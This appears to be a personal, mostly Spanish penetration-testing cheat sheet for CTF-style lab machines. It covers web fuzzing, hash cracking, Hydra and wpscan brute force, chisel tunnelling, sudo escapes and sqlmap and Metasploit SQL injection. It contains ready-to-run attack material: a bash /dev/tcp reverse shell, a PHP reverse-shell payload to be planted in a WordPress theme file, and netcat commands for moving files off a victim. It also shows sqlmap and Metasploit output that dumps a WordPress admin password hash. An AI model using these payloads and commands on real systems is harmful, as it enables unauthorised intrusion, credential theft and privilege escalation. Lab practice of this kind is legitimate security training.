# FUZZ
wfuzz -c -L -t 30 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.65.187.137/FUZZ
## vhost
wfuzz -c -t 30 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.dominio.com" http://IP_OBJETIVO

wfuzz -c -w /ruta/a/diccionario.txt -H "Host: FUZZ.silentium.htb" http://silentium.htb/

# Cheatsheet: Enumeración de VHosts con Wfuzz

Guía rápida de referencia para el descubrimiento de Virtual Hosts (VHosts) y subdominios utilizando **Wfuzz**.

---

## 🚀 Sintaxis Básica

El parámetro clave para VHosts es la cabecera `Host:` junto con el marcador `FUZZ`.

```bash
wfuzz -c -w /ruta/a/diccionario.txt -H "Host: FUZZ.dominio.htb" http://dominio.htb/
```

* **`-c`**: Salida en colores.
* **`-w <file>`**: Especifica el diccionario (*wordlist*).
* **`-H "Host: ..."`**: Inyecta la cabecera HTTP `Host` personalizada.

---

## 🎯 Comandos Listos para Usar

### 1. Escaneo Estándar
```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt   -H "Host: FUZZ.silentium.htb"   http://silentium.htb/
```

### 2. Escaneo sobre HTTPS (Omitir Validación TLS)
```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt   -H "Host: FUZZ.silentium.htb"   --hs "SSL"   https://silentium.htb/
```

### 3. Aumentar Velocidad / Hilos Concurrentes (`-t`)
```bash
wfuzz -c -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt   -H "Host: FUZZ.silentium.htb"   http://silentium.htb/
```

---

## 🧹 Filtrado de Falsos Positivos

Al hacer fuzzeo de VHosts, los servidores suelen responder con una página predeterminada para subdominios inexistentes. Usa estos filtros para ocultar el ruido:

| Parámetro | Descripción | Ejemplo de Uso |
| :--- | :--- | :--- |
| **`--hc`** | **Hide Code**: Oculta por código de estado HTTP | `--hc 404,403` |
| **`--hl`** | **Hide Lines**: Oculta por número de líneas en la respuesta | `--hl 42` |
| **`--hw`** | **Hide Words**: Oculta por número de palabras en la respuesta | `--hw 312` |
| **`--hh`** | **Hide Chars**: Oculta por número de caracteres/bytes | `--hh 1540` |
| **`--sc`** | **Show Code**: Muestra **únicamente** los códigos indicados | `--sc 200,301,302` |
| **`--sw`** | **Show Words**: Muestra únicamente por número de palabras | `--sw 450` |
| **`--sh`** | **Show Chars**: Muestra únicamente por número de caracteres | `--sh 2100` |

### Ejemplos de Filtrado Practicos

#### Ocultar Respuestas por Cantidad de Palabras Repetidas (`--hw`)
```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt   -H "Host: FUZZ.silentium.htb"   --hw 312   http://silentium.htb/
```

#### Ocultar Múltiples Criterios (`--hc` + `--hh`)
```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt   -H "Host: FUZZ.silentium.htb"   --hc 404,400 --hh 1540   http://silentium.htb/
```

#### Mostrar Solo Respuestas Exitosas (`--sc 200`)
```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt   -H "Host: FUZZ.silentium.htb"   --sc 200,301,302   http://silentium.htb/
```

---

## ⚙️ Opciones Avanzadas Útiles

* **`-p 127.0.0.1:8080`**: Envia las peticiones a través de Burp Suite o Caido.
* **`-Z`**: Ignora errores de conexión sin detener la ejecución.
* **`-f salida.txt,csv`**: Exporta los resultados en formato CSV (o `json`, `html`).
* **`-s <delay>`**: Introduce un retardo en segundos entre peticiones para evadir Rate Limiting.

---

## 📂 Diccionarios Recomendados (SecLists)

* `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
* `/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`
* `/usr/share/seclists/Discovery/DNS/namelist.txt`

# GOBUSTER
gobuster dir -u http://************* -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://************* -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
gobuster dir -u http://10.65.187.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -s 200
gobuster dir -u http://10.65.187.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -x txt,html,php

## vhost
gobuster vhost -u http://IP_OBJETIVO -w subdomains.txt

# Transfer files
python3 -m http.server 80 (wget http://<ip_local>/<filename>)
nc -lp 4444 > archivo_recibido.txt # victims machine
nc -w 3 [IP_VICTIMA] 4444 < archivo_a_enviar.txt # attackers machine

# Term treatment    
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
bash
/bin/sh -i

script /dev/null -c bash
ctrl + z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash

# Compress Files
tar -czvf archivo.tar.gz archivo
tar -xzvf archivo.tar.gz

# Decrypt
hashcat -m 0 5b5c3ac3a1c897c94caad48e6c71fdec /usr/share/wordlists/rockyou.txt # for md5sum

ssh2john id_ed25519 > ssh.hash # ssh
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt # ssh
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# AWS
aws configure --profile facts
aws s3 ls --endpoint-url http://facts.htb:54321 --profile facts
aws s3 ls s3://randomfacts --endpoint-url http://facts.htb:54321 --profile facts

# Scanning
arp-scan -I wlan0 --localnet
ping -c 1 IP_VICTIMA
sudo nmap -sn IP_OBJETIVO

# SSH User Enumeration
sudo nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.1.14

# SQLI
' or 1=1 group by 1-- - # using when orger doesnt functions
## Versions
| Base de Datos | Consulta de Versión / Firma
|---------------|----------------------------------
| MySQL / MariaDB | @@version o version()
| PostgreSQL | version()
| Microsoft SQL Server | @@version
| Oracle | SELECT banner FROM v$version
| SQLite | sqlite_version()

# Brute Force HTTP Form
## Hydra
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.15 http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout" -F
```

# Reverse shell
```bash
bash -c 'bash -i >& /dev/tcp/<local_ip>/<port> 0>&1'

```
# Capabilities
```bash
find / -perm -4000 2>/dev/null

```
# Sending files (attacker/victim)
```bash
# attacker
nc -lp 4444 > destino_file.txt

# victims machine
nc 192.168.1.14 4444 < original_file.txt

```

# SSH Brute force
```bash
# make users.txt
# make password.txt
$ hydra -L users.txt -P passwords.txt 192.168.1.12 ssh -V -f # put ip's victims machine


```
# SUDOERS
```bash
sudo -l

```
# Searchsploit
```bash
searchsploit <any_software>
searchsploit -m <script.extension>



```
# CHISEL
```bash
./chisel server --reverse -p 1234 # server
./chisel client 192.168.1.14:1234 R:socks # client
# modificar el archivo proxychains4.conf con la ip asignada por chisel (ex. socks5 127.0.0.1 1080)

```

# TERM
```bash
# abrir procesos en segundo plano
burpsuite &> /dev/null & disown


```

# Directory listing
```bash
gobuster dir -u http://staging.silentium.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,js,html,json,bak,txt

```
```markdown
# Cheatsheet: Directory Listing / Content Discovery (Gobuster & ffuf)

Guía rápida para la enumeración de archivos, directorios y rutas ocultas en aplicaciones web utilizando **Gobuster** (modo `dir`) y **ffuf**.

---

## 🚀 Gobuster (`dir`)

### Sintaxis Básica
```bash
gobuster dir -u [http://ejemplo.htb/](http://ejemplo.htb/) -w /ruta/a/diccionario.txt

```

### Comandos Listos para Usar

```bash
# 1. Búsqueda básica con extensiones
gobuster dir -u [http://silentium.htb/](http://silentium.htb/) \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,js,txt,json

# 2. Ocultar respuestas comunes no deseadas (404, 403)
gobuster dir -u [http://silentium.htb/](http://silentium.htb/) \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -b 404,403

# 3. Escaneo rápido con más hilos y sin verificación SSL
gobuster dir -u [https://silentium.htb/](https://silentium.htb/) \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 50 -k

# 4. Fuzzing autenticado enviando Cookie y User-Agent
gobuster dir -u [http://silentium.htb/admin/](http://silentium.htb/admin/) \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -c "PHPSESSID=1234567890abcdef" \
  -a "Mozilla/5.0 (X11; Linux x86_64)"

```

### Opciones Esenciales de Gobuster

| Parámetro | Descripción | Ejemplo de Uso |
| --- | --- | --- |
| **`-u`** | URL base objetivo | `-u http://10.10.11.X/` |
| **`-w`** | Ruta del diccionario | `-w /path/to/wordlist.txt` |
| **`-x`** | Extensiones separadas por comas | `-x php,txt,xml` |
| **`-t`** | Número de hilos (*threads*, default: 10) | `-t 50` |
| **`-b`** | Ocultar códigos de estado HTTP | `-b 404,403` |
| **`-s`** | Mostrar **únicamente** códigos específicos | `-s "200,301,302"` |
| **`-c`** | Galletas (*Cookies*) de sesión HTTP | `-c "session=xyz"` |
| **`-H`** | Añadir cabecera HTTP personalizada | `-H "Authorization: Bearer token"` |
| **`-r`** | Seguir redirecciones (HTTP 30x) | `-r` |
| **`-k`** | Ignorar errores de certificado SSL/TLS | `-k` |
| **`-o`** | Guardar la salida en un archivo de texto | `-o gobuster_dir.txt` |

---

## ⚡ ffuf (Fuzz Faster U Fool)

### Sintaxis Básica

FFuF requiere colocar la palabra clave **`FUZZ`** donde se inyectará cada elemento del diccionario.

```bash
ffuf -u [http://ejemplo.htb/FUZZ](http://ejemplo.htb/FUZZ) -w /ruta/a/diccionario.txt

```

### Comandos Listos para Usar

```bash
# 1. Búsqueda con extensiones
ffuf -u [http://silentium.htb/FUZZ](http://silentium.htb/FUZZ) \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -e .php,.html,.js,.json,.bak

# 2. Escaneo recursivo (explora subdirectorios encontrados)
ffuf -u [http://silentium.htb/FUZZ](http://silentium.htb/FUZZ) \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -recursion -recursion-depth 2 -e .php

# 3. Filtrado por código de estado HTTP y tamaño
ffuf -u [http://silentium.htb/FUZZ](http://silentium.htb/FUZZ) \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -fc 404 -fs 1240

# 4. Fuzzing a través de proxy (Burp Suite / Caido)
ffuf -u [http://silentium.htb/FUZZ](http://silentium.htb/FUZZ) \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x [http://127.0.0.1:8080](http://127.0.0.1:8080)

```

### Opciones de Filtrado en ffuf

| Parámetro | Descripción | Ejemplo de Uso |
| --- | --- | --- |
| **`-mc`** | **Match Code**: Muestra solo estos códigos HTTP | `-mc 200,301,302` |
| **`-fc`** | **Filter Code**: Oculta estos códigos HTTP | `-fc 404,403` |
| **`-fs`** | **Filter Size**: Oculta respuestas de cierto tamaño (bytes) | `-fs 1540` |
| **`-fw`** | **Filter Words**: Oculta por cantidad de palabras | `-fw 312` |
| **`-fl`** | **Filter Lines**: Oculta por cantidad de líneas | `-fl 42` |
| **`-fr`** | **Filter Regexp**: Oculta respuestas que coincidan con Regex | `-fr "Forbidden"` |

### Opciones Adicionales de ffuf

| Parámetro | Descripción | Ejemplo de Uso |
| --- | --- | --- |
| **`-t`** | Número de hilos (*threads*, default: 40) | `-t 80` |
| **`-p`** | Pause/Delay entre peticiones (segundos) | `-p 0.1` |
| **`-H`** | Añadir cabecera HTTP personalizada | `-H "Cookie: id=1"` |
| **`-o` / `-of**` | Exportar salida a archivo formateado | `-o res.json -of json` |

---

## 📂 Diccionarios Recomendados (SecLists)

* `/usr/share/seclists/Discovery/Web-Content/common.txt`
* `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
* `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt`
* `/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt`

# API
### FUZZING
```bash
ffuf -u http://staging.silentium.htb/api/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -fs 31

ffuf -u http://staging.silentium.htb/api/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,201,301,302,403,405

```

### FUERZA BRUTA LOGIN WORDPRESS
```bash
wpscan --url http://192.168.1.12 --usernames nombre_de_usuario --passwords /ruta/al/diccionario/rockyou.txt

```

### ENCONTRAR ARCHIVOS EN LINUX
```bash
locate rockyou.txt
sudo find / -name "rockyou.txt" 2>/dev/null

```

### WORDPRESS REVERSESHELL
```bash
# Se escucha en la maquina atacante
nc -nlvp 4444

# exploit (in theme 404)
<?php
$ip = '192.168.1.17';
$port = 4444;
$sock = fsockopen($ip, $port);
if ($sock) {
    $descriptors = array(0 => $sock, 1 => $sock, 2 => $sock);
    $process = proc_open('/bin/sh', $descriptors, $pipes);
    if (is_resource($process)) {
        proc_close($process);
    }
}
?>

# url = http://192.168.1.12/wp-content/themes/twentyfifteen/404.php

```

# GTFOBINS
## VIM
### sudo -l
```bash
sudo /usr/bin/vim -c ':!/bin/sh' # main option

# another option
sudo /usr/bin/vim
:set shell=/bin/sh
:shell

# ed
sudo /usr/bin/ed
!/bin/sh

# ALL
sudo su


```

# FTP
### Anonymous Conection
```bash
ftp anonymous@192.168.1.153


```

# SQLMAP
```bash
sqlmap -u "http://192.168.1.9/index.php?rest_route=/wpgmza/v1/markers/&filter={}&fields=*" -p fields --level=2 --risk=1 --batch --dump -T wp_users

+----+----------+------------------------------------+----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url | user_pass                          | user_email           | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------+------------------------------------+----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | <blank>  | $P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1 | webmaster@none.local | webmaster  | 0           | webmaster    | webmaster     | 2019-09-09 12:54:30 | <blank>             |
+----+----------+------------------------------------+----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+

```

# METASPLOIT
```bash
# SQL Injection
msfconsole
search wp_google_maps
use auxiliary/admin/http/wp_google_maps_sqli
set RHOSTS 192.168.1.9
run

# ans
[+] Credentials saved in: /home/edgerunner/.msf4/loot/20261115182546_default_192.168.1.9_wp_google_maps.j_505623.bin
[+] 192.168.1.9:80 - Found webmaster $P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1 webmaster@none.local
[*] Auxiliary module execution completed

```





